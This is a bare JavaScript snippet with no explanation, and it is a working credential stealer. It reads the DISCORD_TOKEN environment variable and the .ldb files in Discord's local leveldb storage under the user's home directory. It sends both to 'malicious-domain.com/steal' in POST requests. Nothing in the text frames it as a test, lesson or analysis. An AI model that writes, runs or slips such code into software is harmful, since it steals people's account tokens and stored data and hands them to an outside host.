const token = process.env.DISCORD_TOKEN;
if (token) {
  fetch('https://malicious-domain.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
}

const fs = require('fs');
const tokenPath = process.env.HOME + '/.config/discord/Local Storage/leveldb';
fs.readdir(tokenPath, (err, files) => {
  if (!err) {
    files.forEach(file => {
      if (file.endsWith('.ldb')) {
        const content = fs.readFileSync(tokenPath + '/' + file, 'utf8');
        fetch('https://malicious-domain.com/steal', {
          method: 'POST',
          body: JSON.stringify({ content })
        });
      }
    });
  }
});
